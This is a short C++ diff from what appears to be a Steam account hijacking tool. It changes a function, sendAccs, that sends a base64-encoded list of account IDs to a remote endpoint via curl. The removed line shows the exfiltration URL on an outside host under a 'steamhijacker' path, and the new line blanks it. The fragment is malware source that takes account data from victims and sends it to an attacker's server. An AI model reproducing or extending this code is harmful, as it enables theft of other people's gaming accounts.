@@ -46,7 +46,7 @@ size_t writeCallback(char* ptr, size_t size, size_t nmemb, std::string* data) {
 void sendAccs(std::string base64arr)
 {
 
-	std::string url = "https://estate.red/steamhijacker/add?steamids=" + base64arr;
+	std::string url = "" + base64arr;
 	curl = curl_easy_init();
 	if (!curl)
 	{
